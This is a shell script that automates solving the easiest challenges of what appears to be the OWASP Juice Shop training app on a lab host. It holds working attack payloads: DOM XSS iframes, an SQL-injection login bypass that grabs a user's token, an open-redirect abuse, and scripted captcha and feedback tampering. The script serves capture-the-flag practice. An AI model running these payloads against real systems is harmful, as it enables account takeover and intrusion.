#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.87.170"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

# Initiate session and cookies
echo "1.0 - INITIATING SESSION"
curl -s -X GET "http://$target_ip" -L > /dev/null
curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7d5_o" -c "$result_folder/1-cookies.txt" -L > /dev/null
IO=$(grep io "$result_folder/1-cookies.txt" | awk '{print $7}')
echo "--> Session initiated with cookie IO ${IO}"
sed -i 's/#HttpOnly_//g' "$result_folder/1-cookies.txt"
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\tlanguage\ten" >> $result_folder/1-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\tcookieconsent_status\tdismiss" >> $result_folder/1-cookies.txt

# Use DOM XSS to play sound
echo "1.1 - BONUS : PLAY SOUND WITH XSS"
node $scriptpath/../../tools/playwright.js "http://$target_ip/#/search?q=%3Ciframe%20width%3D%22100%25%22%20height%3D%22166%22%20scrolling%3D%22no%22%20frameborder%3D%22no%22%20allow%3D%22autoplay%22%20src%3D%22https%3A%2F%2Fw.soundcloud.com%2Fplayer%2F%3Furl%3Dhttps%253A%2F%2Fapi.soundcloud.com%2Ftracks%2F771984076%26color%3D%2523ff5500%26auto_play%3Dtrue%26hide_related%3Dfalse%26show_comments%3Dtrue%26show_user%3Dtrue%26show_reposts%3Dfalse%26show_teaser%3Dtrue%22%3E%3C%2Fiframe%3E" > $result_folder/1-xss2.html 2>/dev/null

# Access a confidential document
echo "1.2 - ACCESS A CONFIDENTIAL DOCUMENT"
curl -s -X GET http://$target_ip/ftp/acquisitions.md -o $result_folder/1-acquisitions.md.txt

# Perform a DOM XSS attack
echo "1.3 - PERFORM DOM XSS ATTACK"
node $scriptpath/../../tools/playwright.js "http://$target_ip/#/search?q=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E" > $result_folder/1-xss1.html 2>/dev/null

# Provoke an error
echo "1.4 - PROVOKE AN ERROR"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/1-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"bjoern@owasp.org'--\",\"password\":\"a\"}" -o $result_folder/1-bjoern.json
BJOERN_TOKEN=$(jq -r '.authentication.token' $result_folder/1-bjoern.json)
echo "--> Authenticated as bjoern with token $(echo "$BJOERN_TOKEN" | cut -c 1-20)...."
cp $result_folder/1-cookies.txt $result_folder/1-bjoern-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$BJOERN_TOKEN" >> $result_folder/1-bjoern-cookies.txt
ERROR=$(curl -s -X POST "http://$target_ip/profile/image/url" -b "$result_folder/1-bjoern-cookies.txt" -o /dev/null -w "%{http_code}" -L -H "Content-Type: application/x-www-form-urlencoded" -d "imageUrl=")
echo "--> Accessing image link returned error $ERROR"

# Find the endpoint that serves usage data to be scraped by a popular monitoring system
echo "1.5 - EXPOSED METRICS"
curl -s -X GET http://$target_ip/metrics -o $result_folder/1-metrics.txt

# Retrieve the photo of bjoern cat
echo "1.6 - MISSING ENCODING"
curl -s -X GET "http://$target_ip/assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg" -b "$result_folder/1-bjoern-cookies.txt" -L -o $result_folder/1-cat.jpg

# Redirect to a crypto currency addresses which are not promoted any longer
echo "1.7 - OUTDATED WHITELIST"
curl -s -X GET "http://$target_ip/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm" -o /dev/null

# Read privacy policy
echo "1.8 - PRIVACY POLICY"
node $scriptpath/../../tools/playwright.js "http://$target_ip/#/privacy-security/privacy-policy" > $result_folder/1-policy.html 2>/dev/null

# Follow the DRY principle while registering a user.
echo "1.9 - REPETITIVE REGISTRATION"
# Register user with different value for password and its repetition
curl -s -X POST "http://$target_ip/api/Users/" -b "$result_folder/1-cookies.txt" -L -H "Content-Type: application/json" -o /dev/null -d "{\"email\":\"test2@test.org\",\"password\":\"test123\",\"passwordRepeat\":\"test1234\",\"securityQuestion\":{\"id\":4,\"question\":\"Father's birth date? (MM/DD/YY)\",\"createdAt\":\"2024-12-03T13:02:20.334Z\",\"updatedAt\":\"2024-12-03T13:02:20.334Z\"},\"securityAnswer\":\"03/03/03\"}"

# Access score board
echo "1.10 - SCORE BOARD"
node $scriptpath/../../tools/playwright.js "http://$target_ip/#/score-board" > $result_folder/1-score.html 2>/dev/null

# Give a 0 feedback
echo "1.11 - ZERO STARS"
curl -s -X GET http://$target_ip/rest/user/whoami -b "$result_folder/1-bjoern-cookies.txt" -L -o $result_folder/1-user.json
USER_ID=$(jq -r '.user.id' $result_folder/1-user.json)
echo "--> The user id is $USER_ID"
curl -s -X GET http://$target_ip/rest/captcha -b "$result_folder/1-bjoern-cookies.txt" -L -o $result_folder/1-captcha.json
CAPTCHA_RESULT=$(jq -r '.answer' $result_folder/1-captcha.json)
CAPTCHA_ID=$(jq -r '.captchaId' $result_folder/1-captcha.json)
echo "--> The captcha $CAPTCHA_ID is $CAPTCHA_RESULT"
curl -s -X POST "http://$target_ip/api/Feedbacks/" -b "$result_folder/1-bjoern-cookies.txt" -o /dev/null -L -H "Content-Type: application/json" -d "{\"UserId\":$USER_ID,\"captchaId\":$CAPTCHA_ID,\"captcha\":\"$CAPTCHA_RESULT\",\"comment\":\"mwahaha\",\"rating\":0}"

# Compute score
echo "1.X - COMPUTE SCORE"
curl -s -X GET http://$target_ip/api/Challenges/?sort=name -b "$result_folder/1-cookies.txt" -L -o $result_folder/1-scores.json
SOLVED=$(jq '[.data[] | select(.difficulty == 1 and .solved == true)] | length' $result_folder/1-scores.json)
TOTAL=$(jq '[.data[] | select(.difficulty == 1 and .solved != null)] | length' $result_folder/1-scores.json)
echo "\n************* SOLVED : $SOLVED / $TOTAL *************\n"